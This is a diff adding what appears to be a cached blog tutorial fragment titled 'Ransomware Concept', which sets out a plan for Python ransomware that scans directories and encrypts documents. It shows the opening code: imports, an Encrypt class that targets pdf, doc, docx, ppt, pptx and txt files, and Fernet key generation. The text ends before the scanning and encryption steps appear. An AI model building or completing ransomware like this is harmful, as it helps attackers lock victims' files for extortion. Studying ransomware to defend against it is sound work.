@@ -1,0 +1,34 @@
+I"8<h3 id="ransomware-concept">Ransomware Concept</h3>
+<p>The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python.</p>
+
+<h4 id="to-do">To do:</h4>
+<ol>
+  <li>generate a key to be used for encryption and decryption</li>
+  <li>write a key to a file</li>
+  <li>read a key from a file</li>
+  <li>scanning directory from top to bottom</li>
+  <li>encypt the target files</li>
+  <li>create cli interface</li>
+</ol>
+
+<h3 id="generate-a-key-to-be-used-for-encryption-and-decryption">generate a key to be used for encryption and decryption</h3>
+<p>for this we can use the <a href="https://cryptography.io/en/latest/fernet/">Fernet(Semantic Encrytion)</a> so import that.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
+from os.path import expanduser
+from cryptography.fernet import Fernet
+
+</code></pre></div></div>
+
+<p>create a class and create a constructor, below that is the generateKey function</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Encrypt:
+    def __init__(self):
+        self.key = None
+        self.cryptor = None
+        self.file_ext_targets = ['pdf','doc','docx','ppt','pptx','txt']
+
+    def generateKey(self): 
+        self.key = Fernet.generate_key()
+        self.cryptor = Fernet(self.key)
+
+</code></pre></div></div>
+:ET
